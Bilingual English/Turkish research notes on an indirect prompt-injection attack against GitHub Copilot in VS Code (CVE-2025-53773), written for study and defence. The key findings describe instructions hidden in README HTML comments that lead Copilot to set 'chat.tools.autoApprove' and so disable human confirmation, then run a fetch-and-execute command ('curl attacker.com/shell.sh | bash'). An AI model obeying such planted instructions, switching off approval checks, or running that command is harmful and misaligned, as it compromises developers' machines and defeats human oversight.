# Research Notes / Araştırma Notları

> Module / Konu: GitHub Copilot Prompt Injection to RCE (CVE-2025-53773)
> Date / Tarih: 2026-05-20

---

## What I'm Investigating / Araştırdığım Konu

How attackers exploit indirect prompt injection in AI coding assistants (specifically GitHub Copilot in VS Code) to achieve Remote Code Execution on developer machines.

Saldırganların yapay zeka kodlama asistanlarındaki (özellikle VS Code'daki GitHub Copilot) dolaylı istem enjeksiyonlarını kullanarak geliştiricilerin makinelerinde Uzaktan Kod Çalıştırma (RCE) elde etmesi.

## Resources Found / Bulunan Kaynaklar

- [Secnora: The Threat of GitHub Copilot Prompt Injections](https://secnora.com) — Detailed breakdown of the attack vector
- [Medium: VS Code RCE via Copilot Chat](https://medium.com) — Step-by-step PoC walkthrough
- [VS Code Workspace Trust Docs](https://code.visualstudio.com/docs/editor/workspace-trust) — Official mitigation guidance
- [GitHub Security Advisory](https://github.com/security) — CVE details and patch information

## Key Findings / Temel Bulgular

1. Copilot Chat reads `README.md` and source code comments as context. Malicious instructions hidden within these files (e.g., inside HTML comments `<!-- -->`) are processed as legitimate prompts.
2. The attack targets `.vscode/settings.json` to set `"chat.tools.autoApprove": true` which disables the human confirmation prompt ("YOLO Mode").
3. Once auto-approve is enabled, the injected prompt instructs Copilot to execute arbitrary shell commands (e.g., `curl attacker.com/shell.sh | bash`) via the integrated terminal.
4. The entire attack chain is invisible to the developer — no pop-ups, no warnings.

## Dead Ends / Çıkmaz Sokaklar

Things I tried that didn't work and why:
- Tried blocking Copilot from editing `.json` files → didn't work because it breaks core Copilot functionality (code suggestions, formatting)
- Tried detecting prompt injection via regex patterns → failed because natural language payloads are too diverse to pattern-match reliably
- Tried sandboxing only the terminal → failed because Copilot needs terminal access for legitimate code execution tasks

## Questions Remaining / Kalan Sorular

- [x] Can Workspace Trust fully prevent this attack? → Yes, in Restricted Mode all agents are disabled
- [x] Does Microsoft's patch fully resolve the vulnerability? → Partially; defense-in-depth is still required
- [ ] Will similar attacks affect other AI assistants (Cursor, Windsurf, etc.)?

## 50-Step Breakdown / 50 Adımlık Çözümleme

Break the topic into 50 small, ordered questions:
1. What is GitHub Copilot? / GitHub Copilot nedir?
2. How does Copilot Chat work? / Copilot Chat nasıl çalışır?
3. What is a "context window" in LLMs? / LLM'lerde "bağlam penceresi" nedir?
4. How does Copilot gather context from open files? / Copilot açık dosyalardan bağlamı nasıl toplar?
5. What is Prompt Injection? / İstem Enjeksiyonu nedir?
6. What is "indirect" prompt injection? / "Dolaylı" istem enjeksiyonu nedir?
7. How can HTML comments hide instructions? / HTML yorumları talimatları nasıl gizleyebilir?
8. What is `.vscode/settings.json`? / `.vscode/settings.json` nedir?
9. What does `chat.tools.autoApprove` do? / `chat.tools.autoApprove` ne yapar?
10. What is "YOLO Mode"? / "YOLO Modu" nedir?
11. How does Copilot execute terminal commands? / Copilot terminal komutlarını nasıl çalıştırır?
12. What is a reverse shell? / Ters kabuk (reverse shell) nedir?
13. How does `curl | bash` work as an attack vector? / `curl | bash` saldırı vektörü olarak nasıl çalışır?
14. What is Remote Code Execution (RCE)? / Uzaktan Kod Çalıştırma (RCE) nedir?
15. What is the CVSS score of this vulnerability? / Bu zafiyetin CVSS puanı nedir?
